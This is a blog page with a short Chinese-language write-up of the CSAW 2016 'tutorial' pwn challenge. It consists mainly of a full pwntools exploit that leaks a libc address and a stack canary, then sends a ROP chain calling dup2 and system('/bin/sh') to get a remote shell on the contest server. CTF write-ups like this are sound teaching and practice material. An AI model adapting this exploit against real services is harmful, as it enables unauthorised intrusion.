<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> CSAW 2016 tutorial writeup · Arvin.X's Blog</title><meta name="description" content="CSAW 2016 tutorial writeup - Arvin.X"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://a7vinx.github.io/atom.xml" title="Arvin.X's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/a7vinx" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">CSAW 2016 tutorial writeup</h1><div class="post-info">Sep 19, 2016</div><div class="post-content"><p>200分的Pwn</p>
<p>同样也是拿到手简单跑一下就扔进IDA里静态看。<br>程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。</p>
<a id="more"></a>
<p>由于已经给了libc就很好办了，拿了puts地址算system、”/bin/sh”地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。</p>
<p>完整exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p=remote('127.0.0.1',9990)</span></div><div class="line">p=remote(<span class="string">'pwn.chal.csaw.io'</span>,<span class="number">8002</span>)</div><div class="line"></div><div class="line">poprdi=<span class="number">0x00000000004012e3</span> <span class="comment"># pop rdi ; ret</span></div><div class="line">poprsi=<span class="number">0x00000000004012e1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></div><div class="line">pick64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">':'</span>)</div><div class="line">buf=p.recvline()</div><div class="line">puts_addr=int(buf,<span class="number">16</span>)+<span class="number">1280</span></div><div class="line"><span class="keyword">print</span> <span class="string">'puts_addr: '</span>+hex(puts_addr)</div><div class="line"></div><div class="line"><span class="comment">#system_addr=puts_addr-0x000000000006b990+0x0000000000041490</span></div><div class="line"><span class="comment">#str_sh=puts_addr-0x000000000006b990+0x1639a0</span></div><div class="line"><span class="comment">#dup2_addr=puts_addr-0x000000000006b990+0x00000000000dc490</span></div><div class="line">system_addr=puts_addr<span class="number">-0x000000000006fd60</span>+<span class="number">0x0000000000046590</span></div><div class="line">str_sh=puts_addr<span class="number">-0x000000000006fd60</span>+<span class="number">0x17c8c3</span></div><div class="line">dup2_addr=puts_addr<span class="number">-0x000000000006fd60</span>+<span class="number">0x00000000000ebe90</span></div><div class="line"><span class="keyword">print</span> <span class="string">'system_addr: '</span>+hex(system_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'binsh_addr: '</span>+hex(str_sh)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ======== leak canary and stack address =========</span></div><div class="line">payload=<span class="string">'A'</span>*<span class="number">4</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">leak=p.recvn(<span class="number">0x144</span>)</div><div class="line"></div><div class="line">canary=pick64(leak[<span class="number">-12</span>:<span class="number">-4</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'canary: '</span>+hex(canary)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># ======== ROP =========</span></div><div class="line">payload2=<span class="string">'A'</span>*<span class="number">312</span></div><div class="line">payload2+=p64(canary)*<span class="number">2</span></div><div class="line"></div><div class="line"><span class="comment"># dup2(4,1)</span></div><div class="line">payload2+=p64(poprdi)</div><div class="line">payload2+=p64(<span class="number">4</span>)</div><div class="line">payload2+=p64(poprsi)</div><div class="line">payload2+=p64(<span class="number">1</span>)*<span class="number">2</span></div><div class="line">payload2+=p64(dup2_addr)</div><div class="line"></div><div class="line"><span class="comment">#dup2(4,0)</span></div><div class="line">payload2+=p64(poprdi)</div><div class="line">payload2+=p64(<span class="number">4</span>)</div><div class="line">payload2+=p64(poprsi)</div><div class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">payload2+=p64(dup2_addr)</div><div class="line"></div><div class="line"><span class="comment"># system('/bin/sh')</span></div><div class="line">payload2+=p64(poprdi)</div><div class="line">payload2+=p64(str_sh)</div><div class="line">payload2+=p64(system_addr)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
</div></article></div></section><footer><div class="paginator"><a href="/2016/09/19/csaw_2016_hungman_writeup/" class="prev">PREV</a><a href="/2016/09/19/csaw_2016_rock_writeup/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://a7vinx.github.io">Arvin.X</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>